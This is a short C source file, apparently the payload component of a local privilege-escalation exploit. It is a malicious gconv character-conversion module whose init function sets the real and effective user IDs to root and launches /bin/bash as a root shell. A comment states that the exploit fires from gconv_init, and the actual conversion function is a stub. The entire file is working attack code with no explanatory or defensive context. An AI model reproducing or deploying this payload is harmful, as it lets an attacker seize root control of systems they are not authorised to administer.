#include <stdio.h>
#include <gconv.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>


int gconv_init (struct __gconv_step *step)
{
    printf("Get effective uid: : %d\n", geteuid());
    printf("Setting real effective user id to 0... it returned: %d\n",setreuid(0,0));
    printf("Spawning root shell");
    system("/bin/bash");
    return 0;
}



int gconv (struct __gconv_step *step, struct __gconv_step_data *data,
       const char **inbuf, const char *inbufend, size_t *written,
       int do_flush)
{
    // Don't need to implement the actual conversion because exploit is triggered with the gconv_init().
    return 0;
}
